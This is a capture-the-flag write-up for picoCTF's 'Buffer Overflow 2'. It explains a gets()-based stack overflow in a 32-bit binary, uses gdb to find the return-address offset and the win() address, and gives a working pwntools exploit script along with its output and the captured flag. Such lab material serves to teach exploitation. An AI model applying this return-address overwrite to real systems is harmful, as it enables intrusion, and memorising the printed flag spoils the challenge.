# Writeup: Buffer Overflow 2

## Introduction

As the title of the challenge implies we will be taking advantage of the buffer overflow vulnerability. The vulnerability is present in the vuln function where a gets call with no limit on the amount of characters you can pass in is called and then input passed to a buffer on the stack of the function. Using this vulnerability we can overwrite the return address of the function just like in buffer overflow 1, this time however the win function whose address we will need to obtain the flag requires 2 arguments to be passed. We can pass these arguments on the stack of the function. 

### Representation Of the Stack of a function in a 32 Bit Binary
```
    [...][buffer ][offset to return address][return address][address that the function we called will return to][argument1][argument2][...]
```
### Relevant Code
```
    void win(unsigned int arg1, unsigned int arg2) {
      char buf[FLAGSIZE];
      FILE *f = fopen("flag.txt","r");
      if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
      }

      fgets(buf,FLAGSIZE,f);
      if (arg1 != 0xCAFEF00D)
        return;
      if (arg2 != 0xF00DF00D)
        return;
      printf(buf);
    }

    void vuln(){
      char buf[BUFSIZE];
      gets(buf);
      puts(buf);
    }
```
## Finding Relevant Information
In order to pull off this attack we need the address of the win function, we need the offset from the buffer to the return address inside the function and we need the two arguments we need to pass to the win function which we already have. In order to get the former 2 we will open up gdb put a breakpoint at the vuln function and then get the stack frame information like so:

```
    gef➤  b vuln
    ...
    gef➤  info frame
    Stack level 0, frame at 0xffffcc40:
     eip = 0x8049340 in vuln; saved eip = 0x80493dd
     called by frame at 0xffffcc70
     Arglist at 0xffffcc38, args:
     Locals at 0xffffcc38, Previous frame's sp is 0xffffcc40
     Saved registers:
      ebp at 0xffffcc38, eip at 0xffffcc3c
```
Now that we have the information of the stack frame we can extract the address where the return address is stored which is 0xffffcc3c. Now we need to get the address of the buffer. We can do this by dissassembling the vuln function like so:

```
    gef➤  disas vuln
    Dump of assembler code for function vuln:
       0x08049338 <+0>:     endbr32
       0x0804933c <+4>:     push   ebp
       0x0804933d <+5>:     mov    ebp,esp
       0x0804933f <+7>:     push   ebx
    => 0x08049340 <+8>:     sub    esp,0x74
       0x08049343 <+11>:    call   0x80491d0 <__x86.get_pc_thunk.bx>
       0x08049348 <+16>:    add    ebx,0x2cb8
       0x0804934e <+22>:    sub    esp,0xc
       0x08049351 <+25>:    lea    eax,[ebp-0x6c]
       0x08049354 <+28>:    push   eax
       0x08049355 <+29>:    call   0x80490f0 <gets@plt>
       0x0804935a <+34>:    add    esp,0x10
       0x0804935d <+37>:    sub    esp,0xc
       0x08049360 <+40>:    lea    eax,[ebp-0x6c]
       0x08049363 <+43>:    push   eax
       0x08049364 <+44>:    call   0x8049120 <puts@plt>
       0x08049369 <+49>:    add    esp,0x10
       0x0804936c <+52>:    nop
       0x0804936d <+53>:    mov    ebx,DWORD PTR [ebp-0x4]
       0x08049370 <+56>:    leave
       0x08049371 <+57>:    ret
    End of assembler dump.    
```

You can see in the dissassembled function that ebp-0x6c is loaded into eax before gets is called telling us that whatever is being loaded into eax is an argument for the gets function. In the provided source code above you can see that the argument for the gets function is the buffer buf meaning ebp-0x6c is the address of the buffer. So the offset from the beginning of the stack to the end of the buffer is 0xffffcc38 - 0x6c which is 0xffffcbcc. Since the instruction pointer points to where the return address is stored 0xffffcc3c - 0xffffcbcc gives us the the offset from the buffer to the where the return address is stored which is 0x70 or 112 bytes. Now that we have the offset, the only information left to find is the address of the win function which we can find in gdb using this command:
```
    gef➤  p win
    $1 = {<text variable, no debug info>} 0x8049296 <win>
```

## Constructing The Payload

Finally, we can construct the payload using pwn tools in python with the information we've gathered.
```
    from pwn import *

    p = remote('saturn.picoctf.net', 50180)

    p.recvuntil(b'\n')
    offset = b'A' * 112
    return_address = 0x8049296
    arg1 = 0xCAFEF00D
    arg2 = 0xF00DF00D

    # format on the stack is: offset + address + fake return address for called function (can be anything) + argument 1 + argument 2
    p.sendline(offset + p32(return_address) + p32(0x0) + p32(arg1) + p32(arg2))

    p.interactive()
```

## Results

Now we can execute the script and deliver the payload so we can obtain the flag.

```
    $ python3 payload.py
    [+] Opening connection to saturn.picoctf.net on port 50180: Done
    [*] Switching to interactive mode
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x0
    picoCTF{argum3nt5_4_d4yZ_59cd5643}[*] Got EOF while reading in interactive
```

And finally we have our flag!
